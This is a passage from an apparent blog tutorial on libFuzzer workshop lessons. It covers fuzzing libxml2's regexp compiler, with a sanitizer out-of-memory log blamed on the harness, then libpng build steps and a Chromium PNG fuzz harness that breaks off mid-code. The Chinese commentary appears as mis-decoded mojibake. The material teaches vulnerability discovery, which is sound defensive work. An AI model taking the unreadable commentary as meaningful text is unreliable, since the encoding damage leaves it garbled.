class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">08</span> git:(master) âœ— clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++<span class="number">11</span> xml_compile_regexp_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 </span><br><span class="line">âœ  <span class="number">08</span> git:(master) âœ— ./libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 -dict=./xml.dict</span><br><span class="line">Dictionary: <span class="number">60</span> entries</span><br><span class="line">INFO: Seed: <span class="number">2400921417</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53352</span> inline <span class="number">8</span>-bit counters): <span class="number">53352</span> [<span class="number">0xd27700</span>, <span class="number">0xd34768</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53352</span> PCs): <span class="number">53352</span> [<span class="number">0x9b36f0</span>,<span class="number">0xa83d70</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">114</span> ft: <span class="number">115</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">30</span>Mb</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">5</span>]: <span class="number">0x551cf0</span> in ignore(void*, char <span class="keyword">const</span>*, ...) /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/xml_compile_regexp_fuzzer.cc:<span class="number">16</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">5</span>]: <span class="number">0x552d00</span> in __xmlRaiseError /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/<span class="type">error</span>.c:<span class="number">461</span></span><br><span class="line">#<span class="number">6</span>NEW    cov: <span class="number">150</span> ft: <span class="number">169</span> corp: <span class="number">2</span>/<span class="number">2</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">1</span>/<span class="number">1</span> MS: <span class="number">3</span> ShuffleBytes-ShuffleBytes-ChangeByte-</span><br><span class="line">#<span class="number">10</span>NEW    cov: <span class="number">155</span> ft: <span class="number">223</span> corp: <span class="number">3</span>/<span class="number">4</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">4</span> ChangeBit-ShuffleBytes-ShuffleBytes-InsertByte-</span><br><span class="line">#<span class="number">12</span>NEW    cov: <span class="number">156</span> ft: <span class="number">277</span> corp: <span class="number">4</span>/<span class="number">8</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> ShuffleBytes-CopyPart-</span><br><span class="line">#<span class="number">13</span>NEW    cov: <span class="number">161</span> ft: <span class="number">282</span> corp: <span class="number">5</span>/<span class="number">12</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">20</span>NEW    cov: <span class="number">175</span> ft: <span class="number">302</span> corp: <span class="number">6</span>/<span class="number">14</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeByte-ChangeBinInt-</span><br><span class="line">#<span class="number">24</span>NEW    cov: <span class="number">177</span> ft: <span class="number">305</span> corp: <span class="number">7</span>/<span class="number">16</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> EraseBytes-ChangeBinInt-ChangeBit-InsertByte-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x604f00</span> in xmlFAReduceEpsilonTransitions /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">1777</span></span><br><span class="line">#<span class="number">28</span>NEW    cov: <span class="number">206</span> ft: <span class="number">336</span> corp: <span class="number">8</span>/<span class="number">19</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">4</span> ShuffleBytes-ChangeByte-ChangeBit-CMP- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">32</span>NEW    cov: <span class="number">209</span> ft: <span class="number">343</span> corp: <span class="number">9</span>/<span class="number">21</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> ManualDict-ShuffleBytes-ShuffleBytes-ChangeBit- DE: <span class="string">&quot;&lt;!&quot;</span>-</span><br><span class="line">#<span class="number">38</span>NEW    cov: <span class="number">210</span> ft: <span class="number">344</span> corp: <span class="number">10</span>/<span class="number">25</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">45</span>NEW    cov: <span class="number">210</span> ft: <span class="number">347</span> corp: <span class="number">11</span>/<span class="number">29</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> CopyPart-ChangeByte-</span><br><span class="line">#<span class="number">47</span>NEW    cov: <span class="number">211</span> ft: <span class="number">366</span> corp: <span class="number">12</span>/<span class="number">33</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> CopyPart-ChangeBinInt-</span><br><span class="line">#<span class="number">50</span>NEW    cov: <span class="number">211</span> ft: <span class="number">367</span> corp: <span class="number">13</span>/<span class="number">37</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">3</span> ChangeBinInt-CopyPart-ChangeBinInt-</span><br><span class="line">#<span class="number">57</span>NEW    cov: <span class="number">211</span> ft: <span class="number">388</span> corp: <span class="number">14</span>/<span class="number">40</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ManualDict-CrossOver- DE: <span class="string">&quot;\&quot;\&quot;&quot;</span>-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x606d20</span> in xmlFARecurseDeterminism /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">2589</span></span><br><span class="line">#<span class="number">64</span>NEW    cov: <span class="number">233</span> ft: <span class="number">421</span> corp: <span class="number">15</span>/<span class="number">43</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeBit-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">66</span>NEW    cov: <span class="number">235</span> ft: <span class="number">426</span> corp: <span class="number">16</span>/<span class="number">47</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> EraseBytes-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">68</span>REDUCE cov: <span class="number">235</span> ft: <span class="number">426</span> corp: <span class="number">16</span>/<span class="number">46</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">72</span>NEW    cov: <span class="number">236</span> ft: <span class="number">427</span> corp: <span class="number">17</span>/<span class="number">50</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">4</span> ShuffleBytes-PersAutoDict-ShuffleBytes-ShuffleBytes- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">86</span>REDUCE cov: <span class="number">236</span> ft: <span class="number">427</span> corp: <span class="number">17</span>/<span class="number">48</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> ChangeByte-ChangeBinInt-CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">92</span>NEW    cov: <span class="number">237</span> ft: <span class="number">431</span> corp: <span class="number">18</span>/<span class="number">49</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">1</span>/<span class="number">4</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">103</span>NEW    cov: <span class="number">237</span> ft: <span class="number">433</span> corp: <span class="number">19</span>/<span class="number">53</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">104</span>REDUCE cov: <span class="number">237</span> ft: <span class="number">433</span> corp: <span class="number">19</span>/<span class="number">50</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">1</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x600e30</span> in xmlFAParseCharClassEsc /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">4843</span></span><br><span class="line">#<span class="number">115</span>NEW    cov: <span class="number">243</span> ft: <span class="number">439</span> corp: <span class="number">20</span>/<span class="number">54</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">118</span>NEW    cov: <span class="number">246</span> ft: <span class="number">447</span> corp: <span class="number">21</span>/<span class="number">58</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">3</span> CrossOver-PersAutoDict-ChangeBinInt- DE: <span class="string">&quot;\&quot;\&quot;&quot;</span>-</span><br><span class="line">#<span class="number">134</span>REDUCE cov: <span class="number">249</span> ft: <span class="number">457</span> corp: <span class="number">22</span>/<span class="number">62</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">137</span>REDUCE cov: <span class="number">249</span> ft: <span class="number">460</span> corp: <span class="number">23</span>/<span class="number">64</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">3</span> InsertByte-EraseBytes-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">145</span>NEW    cov: <span class="number">250</span> ft: <span class="number">461</span> corp: <span class="number">24</span>/<span class="number">66</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">3</span> CopyPart-EraseBytes-ChangeBit-</span><br><span class="line">#<span class="number">153</span>NEW    cov: <span class="number">250</span> ft: <span class="number">507</span> corp: <span class="number">25</span>/<span class="number">69</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">3</span> CrossOver-ShuffleBytes-CopyPart-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x600890</span> in xmlFAParseCharGroup /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">5100</span></span><br><span class="line">#<span class="number">165</span>NEW    cov: <span class="number">254</span> ft: <span class="number">511</span> corp: <span class="number">26</span>/<span class="number">71</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">2</span> InsertByte-ManualDict- DE: <span class="string">&quot;[]&quot;</span>-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">8434</span>==ERROR: AddressSanitizer: allocator is out of memory trying to allocate <span class="number">0x18</span> bytes</span><br><span class="line">==<span class="number">8434</span>==ERROR: AddressSanitizer failed to allocate <span class="number">0x2000</span> (<span class="number">8192</span>) bytes of InternalMmapVector (<span class="type">error</span> code: <span class="number">12</span>)</span><br><span class="line">ERROR: Failed to mmap</span><br><span class="line">MS: <span class="number">4</span> ChangeBit-EraseBytes-PersAutoDict-ChangeBit- DE: <span class="string">&quot;[]&quot;</span>-; base unit: <span class="number">85</span>f707600c5524d8497fd94066e422258633e02f</span><br><span class="line"><span class="number">0x7f</span>,<span class="number">0x5b</span>,<span class="number">0xdd</span>,</span><br><span class="line">\x7f[\xdd</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash-dffb37701985bd6539dcbcfe2a04661627b040ff</span><br><span class="line">Base64: f1vd</span><br></pre></td></tr></table></figure><p>å¥½å®¶ä¼™ï¼Œè¿™ä¸ªharnesså‡ ç§’æŠ›å‡ºäº†crashï¼Œè¯´æ˜å¯¹äºçš„å…¥å£å‡½æ•°çš„é€‰æ‹©è‡³å…³é‡è¦ã€‚ä½†è¿™æ¬¡çš„å¼‚å¸¸æœ‰ç‚¹å¥‡æ€ª<code>==8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytes</code>æè¿°è¯´ç”³è¯·è¶…å‡ºäº†å†…å­˜ï¼Œä¹Ÿæ²¡æœ‰SUMMARYå¯¹æ¼æ´è¿›è¡Œå®šä½ã€‚<br>å› æ­¤æˆ‘ä»¬åº”è¯¥æ„è¯†åˆ°é—®é¢˜æ˜¯å‡ºåœ¨äº†harnessä¸Šï¼Œç”±äºåœ¨<code>xml_compile_regexp_fuzzer.cc</code>ä¸­ä½¿ç”¨<code>std::vector&lt;uint8_t&gt; buffer(size + 1, 0);</code>å¯¹dataè¿›è¡Œè½¬å‚¨ï¼Œåœ¨æ ·ä¾‹ä¸æ–­å¢åŠ çš„è¿‡ç¨‹ä¸­vectorè¶…å‡ºäº†æ‰©å®¹çš„å†…å­˜é™åˆ¶ï¼Œä»è€ŒæŠ›å‡ºäº†crashï¼Œè¿™å¹¶ä¸æ˜¯æµ‹è¯•å‡½æ•°<code>xmlRegexpCompile</code>å‡½æ•°çš„é—®é¢˜ã€‚<br>åœ¨å¦ä¸€ä¸ªå¯¹<code>xmlReadMemory</code>çš„fuzzè¿˜åœ¨è¿›è¡Œï¼Œå­¦é•¿è¯´å®ƒfuzzè¿™ä¸ªå‡½æ•°èŠ±äº†åå‡ ä¸ªå°æ—¶æ‰å‡ºcrashã€‚</p><h4 id="lesson-09-the-importance-of-seed-corpus"><a href="#lesson-09-the-importance-of-seed-corpus" class="headerlink" title="lesson 09(the importance of seed corpus)"></a>lesson 09(the importance of seed corpus)</h4><p>è¿™æ¬¡æˆ‘ä»¬çš„ç›®æ ‡ä¸ºå¼€æºåº“libpngï¼Œé¦–å…ˆå¯¹æºç è¿›è¡Œç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">tar xzf libpng.tgz</span><br><span class="line">cd libpng</span><br><span class="line"></span><br><span class="line"># Disable logging via library build configuration control.</span><br><span class="line">cat scripts/pnglibconf.dfa | sed -e &quot;s/option STDIO/option STDIO disabled/&quot; \</span><br><span class="line">&gt; scripts/pnglibconf.dfa.temp</span><br><span class="line">mv scripts/pnglibconf.dfa.temp scripts/pnglibconf.dfa   #è¿™é‡ŒæŠŠé”™è¯¯æ¶ˆæ¯ç¦ç”¨</span><br><span class="line"></span><br><span class="line"># build the library.</span><br><span class="line">autoreconf -f -i</span><br><span class="line">#1</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address \</span><br><span class="line">    -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;</span><br><span class="line"></span><br><span class="line">./configure CC=&quot;clang&quot; CFLAGS=&quot;$FUZZ_CXXFLAGS&quot;</span><br><span class="line">make -j2     </span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure><p>workshopç»™å‡ºçš„æ˜¯#1çš„ç¼–è¯‘ç­–ç•¥ï¼Œæ²¡æœ‰å¯ç”¨é‡‡æ ·åˆ†æå™¨ï¼Œè€Œä¸” -fsanitize-coverage&#x3D;trace-pc-guardé€‚ç”¨åœ¨older versionçš„libfuzzerã€‚å› æ­¤æˆ‘ç”¨çš„æ˜¯#2çš„ç¼–è¯‘ç­–ç•¥ï¼Œä¸Šä¸€ä¸ªlessonè¯æ˜è¿™æ ·çš„ç¼–è¯‘æ’æ¡©èƒ½æœ‰æ•ˆæé«˜fuzzçš„æ•ˆç‡ã€‚<br>æä¾›çš„harnessï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2015 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PNG_INTERNAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;png.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BufState</span> &#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint8_t</span>* data;</span><br><span class="line">  <span class="type">size_t</span> bytes_left;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PngObjectHandler</span> &#123;</span></span><br><span class="line">  png_infop info_ptr = nullptr;</span><br><span class="line">  png_structp png_ptr = nullptr;</span><br><span class="line">  png_voidp row_ptr = nullptr;</span><br><span class="line">  BufState* buf_state = nullptr;</span><br><span class="line"></span><br><span class="line">  ~PngObjectHandler() &#123;</span><br><span class="line">    <span class="keyword">if</span> (row_ptr &amp;&amp; png_ptr) &#123;</span><br><span class="line">      png_free(png_ptr, row_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (png_ptr &amp;&amp; info_ptr) &#123;</span><br><span class="line">      png_destroy_read_struct(&amp;png_ptr, &amp;info_ptr, nullptr);</span><br><span class="line">    &#125;</span><br><span class="line">    delete buf_state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">user_read_data</span><span class="params">(png_structp png_ptr, png_bytep data, <span class="type">png_size_t</span> length)</span> &#123;</span><br><span class="line">  BufState* buf_state = static_cast&lt;BufState*&gt;(png_get_io_ptr(png_ptr));</span><br><span class="line">  <span class="keyword">if</span> (length &gt; buf_state-&gt;bytes_left) &#123;</span><br><span class="line">    png_error(png_ptr, <span class="string">&quot;read error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(data, buf_state-&gt;data, length);</span><br><span class="line">  buf_state-&gt;bytes_left -= length;</span><br><span class="line">  buf_state-&gt;data += length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kPngHeaderSize = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="comment">// Roughly follows the libpng book example:</span></span><br><span class="line"><span class="comment">// http://www.libpng.org/pub/png/book/chapter13.html</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; kPngHeaderSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title function_">v</span><span class="params">(data, data + size)</span>;</span><br><span class="line">  <span class="keyword">if</span> (png_sig_cmp(v.data(), <span class="number">0</span>, kPngHeaderSize)) &#123;</span><br><span class="line">    <span class="comment">// not a PNG.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  PngObjectHandler png_handler;</span><br><span class="line">  png_handler.png_ptr = png_create_read_struct</span><br><span class="line">    (PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);</span><br><span class="line">  <span class="keyword">if</span> (!png_handler.png_ptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  png_set_user_limits(png_handler.png_ptr, <span class="number">2048</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">  png_set_crc_action(png_handler.png_ptr, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE);</span><br><span class="line"></span><br><span class="line">  png_handler.info_ptr = png_create_info_struct(png_handler.png_ptr);</span><br><span class="line">  <span class="keyword">if</span> (!png_handler.info_ptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setting up reading from buffer.</span></span><br><span class="line">  png_handler.buf_state = new BufState();</span><br><span class="line">  png_handler.buf_state-&gt;data = data + kPngHeaderSize;</span><br><span class="line">  png_handler.buf_state-&gt;bytes_left = size - kPngHeaderSize;</span><br><span class="line">  png_set_read_fn(png_handler.png_ptr, png_handler.buf_state, user_read_data);</span><br><span class="line">  png_set_sig_bytes(png_handler.png_ptr, kPngHeaderSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// libpng error handling.</span></span><br><span class="line">  <span class="keyword">if</span> (setjmp(png_jmpbuf(png_handler.png_ptr))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reading.</span></span><br><span class="line">  png_read_info(png_handler.png_ptr, png_handler.info_ptr);</span><br><span class="line">  png_handler.row_ptr = png_malloc(</span><br><span class="line">      png_handler.png_ptr, png_get_rowbytes(png_handler.png_ptr,</span><br><span class="line">                                               png_handler.info_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// reset error handler to put png_deleter into scope.</span></span><br><span class="line">  <span class="keyword">if</span> (setjmp(png_jmpbuf(png_handler.png_ptr))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  png_uint_32 width, height;</span><br><span class="line">  <span class="type">int</span> bit_depth, color_type, interlace_type, compression_type;</span><br><span class="line">  <span class="type">int</span> filter_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!png_get_IHDR(png_handler.png_ptr, png_handler.info_ptr, &amp;width,</span><br><span class="line">                    &amp;height, &amp;bit_depth, &amp;color_type, &amp;interlace_type,</span><br><span class="line">                    &amp;compression_type, &amp;filter_type)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This is going to be too slow.</span></span><br><span class="line">  <span class="keyword">if</span> (width &amp;&amp; height &gt; <span class="number">100000000</span> / width)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (width &gt; <span class="number">2048</span> || height &gt; <span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span 